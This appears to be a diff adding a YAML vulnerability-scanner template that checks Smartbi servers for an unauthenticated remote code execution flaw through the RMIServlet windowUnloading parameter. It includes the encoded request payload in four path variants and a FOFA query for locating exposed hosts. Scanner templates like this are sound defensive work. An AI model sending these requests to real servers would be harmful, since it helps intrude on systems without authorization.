@@ -1,0 +1,48 @@
+id: smartbi-windowunloading-other
+
+info:
+  name: Smartbi 远程代码执行漏洞
+  author: xpoc
+  severity: critical
+  verified: true
+  description: |
+    Smartbi可在未经过身份认证的情况下，调用后台接口，执行攻击者构造的代码，从而导致服务器失陷。
+    FOFA: app="SMARTBI"
+  reference:
+    - https://stack.chaitin.com/techblog/detail?id=122
+  tags: smartbi,rce
+  created: 2023/07/13
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /smartbi/vision/RMIServlet?windowUnloading=&%7a%44%70%34%57%70%34%67%52%69%70%2b%69%49%70%69%47%5a%70%34%44%52%77%36%2b%2f%4a%56%2f%75%75%75%37%75%4e%66%37%4e%66%4e%31%2f%75%37%31%27%2f%4e%4f%4a%4d%2f%4e%4f%4a%4e%2f%75%75%2f%4a%54
+      body: |
+        className=UserService&methodName=isLogged&params=[]
+    expression: response.body.bcontains(b'H~CxOm')
+  r1:
+    request:
+      method: POST
+      path: /vision/RMIServlet?windowUnloading=&%7a%44%70%34%57%70%34%67%52%69%70%2b%69%49%70%69%47%5a%70%34%44%52%77%36%2b%2f%4a%56%2f%75%75%75%37%75%4e%66%37%4e%66%4e%31%2f%75%37%31%27%2f%4e%4f%4a%4d%2f%4e%4f%4a%4e%2f%75%75%2f%4a%54
+      body: |
+        className=UserService&methodName=isLogged&params=[]
+    expression: response.body.bcontains(b'H~CxOm')
+  r2:
+    request:
+      method: POST
+      path: /smartbi/vision/RMIServlet?windowUnloading=%7a%44%70%34%57%70%34%67%52%69%70%2b%69%49%70%69%47%5a%70%34%44%52%77%36%2b%2f%4a%56%2f%75%75%75%37%75%4e%66%37%4e%66%4e%31%2f%75%37%31%27%2f%4e%4f%4a%4d%2f%4e%4f%4a%4e%2f%75%75%2f%4a%54
+      body: |
+        className=UserService&methodName=isLogged&params=[]
+    expression: response.body.bcontains(b'H~CxOm')
+  r3:
+    request:
+      method: POST
+      path: /vision/RMIServlet?windowUnloading=%7a%44%70%34%57%70%34%67%52%69%70%2b%69%49%70%69%47%5a%70%34%44%52%77%36%2b%2f%4a%56%2f%75%75%75%37%75%4e%66%37%4e%66%4e%31%2f%75%37%31%27%2f%4e%4f%4a%4d%2f%4e%4f%4a%4e%2f%75%75%2f%4a%54
+      body: |
+        className=UserService&methodName=isLogged&params=[]
+    expression: response.body.bcontains(b'H~CxOm')
+expression: r0() || r1() || r2() || r3()
+
+
+
